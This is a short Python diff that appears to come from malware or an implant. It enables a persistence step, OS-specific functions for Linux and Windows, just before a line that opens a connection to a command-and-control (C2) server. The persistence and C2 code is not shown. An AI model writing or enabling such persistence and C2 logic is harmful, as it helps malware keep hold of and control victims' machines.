@@ -522,12 +522,12 @@ def main():
 
     # Persistence
     persistence = {}
-    #print("Start persistence...")
-    #if platform.system() == "Linux":
-    #    persistence_linux(persistence)
-    #elif platform.system() == "Windows":
-    #    persistence_windows(persistence)
-    #print("Finished persistence !")
+    print("Start persistence...")
+    if platform.system() == "Linux":
+        persistence_linux(persistence)
+    elif platform.system() == "Windows":
+        persistence_windows(persistence)
+    print("Finished persistence !")
 
     # Start secure connection with C2
     ss = init_connection()
